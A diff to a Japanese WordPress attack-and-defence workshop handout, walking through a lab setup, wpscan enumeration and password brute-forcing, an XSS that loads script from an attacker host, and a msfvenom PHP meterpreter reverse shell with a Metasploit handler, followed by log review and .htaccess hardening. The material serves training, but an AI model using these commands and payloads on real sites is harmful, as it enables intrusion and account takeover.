@@ -20,10 +20,12 @@ WordPressは誰でも簡単にスタイリッシュなWebサイトを構築で�
 W3Techsによると全世界のWebサイトのうち32%はWordPressで作成されているそうです。
 一方でWordPressには非常に多くの脆弱性が発見されており改ざんの被害が後を絶ちません。
 改ざんされたWordPressはマルウェアの配布に利用されることもあります。
-WordPressを防衛することは、サイバー空間の安全を維持し、サイトオーナーとユーザーの価値を最大化することに繋がります。
+Webサイトを防衛することは、サイバー空間の安全を維持し、サイトオーナーとユーザーの価値を最大化することに繋がります。
 
 効果的な防衛を実現するためには、防衛対象の仕組みを理解した上で攻撃手段を理解しなければなりません。
-まずは環境構築を通じてWordPressの仕組みを学びましょう。次にサイバーキルチェーンに従っていくつかの代表的な攻撃手段を学びましょう。最後に攻撃の痕跡がどのように残るのか検証し、効果的な防衛について議論しましょう。
+まずは環境構築を通じてWordPressの仕組みを学びましょう。
+次にサイバーキルチェーンに従っていくつかの代表的な攻撃手段を学びましょう。
+最後に攻撃の痕跡がどのように残るのか検証し、効果的な防衛について議論しましょう。
 
 # 免責
 このセッションにはWordPressを改ざんする具体的なノウハウが含まれますが、読者に対して改ざん行為を推奨するものではありません。
@@ -43,7 +45,7 @@ WordPressは次のコンポーネントから構成されます。
 
 ## PHP
 ```
-# phpのインストール
+# phpのインストール (11/20のワークショップ環境ではインストール済みです)
 yum install -y php php-mysql
 
 # phpが動作することを確認
@@ -69,6 +71,7 @@ echo "<?php phpinfo(); ?>" > /var/www/html/index.php
 systemctl stop firewalld
 
 # SELinuxの停止
+
 setenforce 0
 ```
 
@@ -83,7 +86,7 @@ WordpressのバックエンドDBのMySQLを用意します。
 
 ```
 # MariaDBのインストールと起動
-yum install -y mariadb mariadb-server
+yum install -y mariadb mariadb-server (11/20のワークショップ環境ではインストール済みです)
 systemctl enable mariadb
 systemctl start mariadb
 
@@ -119,7 +122,7 @@ wordpress公式が古いバージョンのWordPressを配布しています。
 
 ```
 # wordpressのダウンロードと設置
-curl https://ja.wordpress.org/wordpress-4.7-ja.tar.gz -o /tmp/wordpress-4.7-ja.tar.gz
+curl https://ja.wordpress.org/wordpress-4.7-ja.tar.gz -o /tmp/wordpress-4.7-ja.tar.gz (11/20のワークショップ環境ではダウンロード済みです)
 tar -zxvf /tmp/wordpress-4.7-ja.tar.gz -C /var/www/html/
 mv /var/www/html/wordpress/ /var/www/html/4.7.0/
 
@@ -184,6 +187,8 @@ echo "select * from wp_usermeta where meta_key Like 'wp_capabilities';" | mysql 
 
 **プラグインの取得**
 
+11/20のワークショップ環境ではこれらの操作は実施済みです。
+plugin.zipを別途配布しているので確認してください。
 ```
 yum install -y wget zip
 cd /tmp
@@ -225,12 +230,12 @@ sudo wpscan --url http://172.16.0.253/4.7.0/ --wp-content-dir wp-content
 sudo wpscan --url http://172.16.0.253/4.7.0/ --wp-content-dir wp-content --enumerate u
 
 # ユーザーアカウントを指定してパスワードリストの中から一致する物を全探索する
-sudo wpscan --url http://172.16.0.253/4.7.0/ --wp-content-dir wp-content --usernames wpuser --passwords /tmp/password
+sudo wpscan --url http://172.16.0.253/4.7.0/ --wp-content-dir wp-content --usernames wpuser --passwords /var/opt/password
 ```
 
 ブルートフォースを行う際は、質の良いパスワードリストの入手が課題になります。
 [OpenWall](https://download.openwall.net/pub/wordlists/passwords/password.gz)が提供しているリストは基本的なワードが含まれていてコンパクトなので手軽に利用できます。
-また、pastebinやtorネットワーク上に実システムから漏えいしたパスワードリストがアップロードされるている事もあります。
+また、pastebinやgithub上に実システムから漏えいしたパスワードリストがアップロードされるている事もあります。
 
 WordPressのバージョンや脆弱性のあるPluginの有無などの情報を収集できましたか？
 ターゲットが複雑なパスワードを使用していなかった場合は、この時点で特権アカウントの情報も入手出来ているかもしれません。
@@ -330,15 +335,14 @@ U2FsdGVkX1+Rh7jbi2fXs9n9B5JhXI6qy+M8rW0VhErb+AM8ZkAfh9AxkBkqBtCjjr+UNy7Hd9c0bQn2
 この制約下で攻撃を成功させるために次の戦術を採用することにしましょう。
 
 1. スクリプトを配布するためのWebサーバを用意する
-2. 用意したWebサーバにスクリプトを設置する
-3. Activity Logに`<script src=設置したスクリプト></script>`を注入する
+2. 172.16.0.254をWebサーバとして運用し/var/www/html/userXXX/ディレクトリにスクリプトを設置する
+3. Activity Logに`<script src=http://172.16.0.254/userXXX/スクリプト></script>`を注入する
 
 XSSを起動するにはActivity Logを表示する必要があります。
 本来は管理者のアクセスを待つ場面ですが、このセッションではあなたが管理者に代わってXSSを起動してください。
 
 ダッシュボードから 外観>テーマの編集>テーマヘッダー を確認するとXSSで注入されたphpコードが確認できます。
 テーマヘッダーはWordPressのヘッダーを出力するためのphpファイルです。
-この改ざんはあらゆるページに影響するということです。
 
 ![](/images/wordpress/xss02.png)
 
@@ -385,7 +389,7 @@ Kali Linuxを起動してphpのリバースシェルを生成しましょう。
 
 **リバースシェルの生成**
 ```
-msfvenom -p php/meterpreter/reverse_tcp LHOST=172.16.0.254 LPORT=4444 -f raw
+sudo msfvenom -p php/meterpreter/reverse_tcp LHOST=172.16.0.254 LPORT=4444 -f raw
 
 ↓ 出力結果
 
@@ -400,7 +404,7 @@ msfvenom -p php/meterpreter/reverse_tcp LHOST=172.16.0.254 LPORT=4444 -f raw
 Kali LinuxでMetasploitを使ってreverse_tcpを起動します。
 
 ```
-msfconsole
+sudo msfconsole
 use exploit/multi/handler
 set payload php/meterpreter/reverse_tcp
 set LHOST 172.16.0.254
@@ -418,6 +422,7 @@ Webブラウザからリバースシェルが設置されたphpファイルに�
 ![](/images/wordpress/reverse03.png)
 
 Metasploitのコンソールを確認するとコネクトバックが成立していることが分かります。
+`shell`コマンドを実行すればターゲットのシェルを奪えます。
 
 ![](/images/wordpress/metasploit.png)
 
@@ -439,24 +444,24 @@ egrep wp-login.php /var/log/httpd/access_log
 10.0.2.2 - - [08/Nov/2018:22:31:39 +0900] "POST /4.7.0/wp-login.php HTTP/1.1" 200 3289 "-" "Fiddler"
 ```
 
-攻撃の糸口になるようなファイルへのアクセスを制限する事が出来ます。
+.htaccessを使えば攻撃の糸口になるようなファイルへのアクセスを制限する事が出来ます。
 Filesタイプのdeny from allディレクティブを定義すれば、ローカルホスト以外のログイン試行を防ぐことが出来ます。
 
 ```
-cat /var/www/html/4.7.0/.htaccess
+# /var/www/htmlのAllowOverrideパラメータをAllに変更する
+vim /etc/httpd/conf/httpd.conf
 
-# BEGIN WordPress
-<IfModule mod_rewrite.c>
-RewriteEngine On
-RewriteBase /4.7.0/
-RewriteRule ^index\.php$ - [L]
-RewriteCond %{REQUEST_FILENAME} !-f
-RewriteCond %{REQUEST_FILENAME} !-d
-RewriteRule . /4.7.0/index.php [L]
-</IfModule>
+<Directory "/var/www/html">
+  AllowOverride All
+
+# httpdを再起動する
+systemctl restart httpd
+
+# .htaccessにアクセス制御を追記する
+vim /var/www/html/4.7.0/.htaccess
 
 <Files ~ "^wp-login.php$">
-deny from all
+  deny from all
 </Files>
 ```
 
@@ -537,11 +542,17 @@ ITシステムの多くがネットワークに接続されている現状にお
 
 # まとめ
 
-このセッションを通じてあなたはWordPressでWebサイトを構築する最低限のノウハウを得ました。
-知識を得るだけで満足せず、積極的に検証を重ねてノウハウを定着させてください。
+あなたはこのセッションを通じてWordPressでWebサイトを構築する最低限のノウハウを得ました。
+WordPressはPHPで書かれたWebアプリケーションでありバックエンドにMySQLを利用しています。
+今回はApache httpdにデプロイしましたがNginxやIISでも動かすことが出来ます。
+Webサーバを覚えるのに最適な教材なので積極的に検証を重ねてください。
 
 あなたはサイバーキルチェーンの概念を知りWordPressに対する具体的な攻撃手段の一部を知ることが出来ました。
-ただし、大いなる力には、大いなる責任が伴うことを忘れないでください。
+サイバーキルチェーンは偵察から始まり、いくつかの段階を経てターゲットを掌握し最終的な目的を達成します。
+筆者はその中でも特に重要な攻撃ステージは特権アカウントの獲得だと考えています。
+どんなシナリオなら特権アカウントを獲得できるか考えてみてください。
+githubやexploit-dbを探せばヒントは沢山見つかります。
 
-あなたはWordPressに対する攻撃を防ぎ、万が一攻撃を受けたとしても検知する方法に触れました。
-ぜひその知識と力をサイバー空間の安全を守るために行使してください。
+あなたはWordPressに対する攻撃を防ぎ、万が一攻撃を受けたとしても検知する方法を知りました。
+Webサーバを要塞化するにはやはりWebサーバの設定やアプリケーションの脆弱性を知り尽くす必要があります。
+攻撃のシナリオを立てつつ、それに対する防衛策を調べてみましょう。
